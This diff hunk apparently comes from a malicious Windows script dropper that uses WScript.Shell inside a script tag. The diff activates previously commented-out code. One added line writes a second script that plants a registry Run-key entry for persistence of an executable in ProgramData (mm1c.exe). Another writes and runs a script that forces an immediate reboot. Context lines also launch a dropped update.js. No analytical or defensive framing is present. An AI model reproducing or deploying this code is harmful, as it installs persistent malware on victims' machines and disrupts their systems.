@@ -51,12 +51,12 @@
       h.Close();shell.run("C://ProgramData//update.js", 1);
       // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm', and mm1.exe in ProgramData }
       
-      //var s = s.CreateTextFile("C://ProgramData/parhai.js", 2, true);
-      //s.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(15000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');s.Close();
+      var s = s.CreateTextFile("C://ProgramData/parhai.js", 2, true);
+      s.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(15000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');s.Close();
 
       // reboot
-      //var r = p.CreateTextFile("C://ProgramData//r.js", 2, true);
-      //r.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(200000);var exec = shell.run('cmd.exe /k shutdown /r /f /t 0',0,true);");r.Close();shell.run("C://ProgramData//r.js", 1);
+      var r = p.CreateTextFile("C://ProgramData//r.js", 2, true);
+      r.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(200000);var exec = shell.run('cmd.exe /k shutdown /r /f /t 0',0,true);");r.Close();shell.run("C://ProgramData//r.js", 1);
     }
     
 </script>
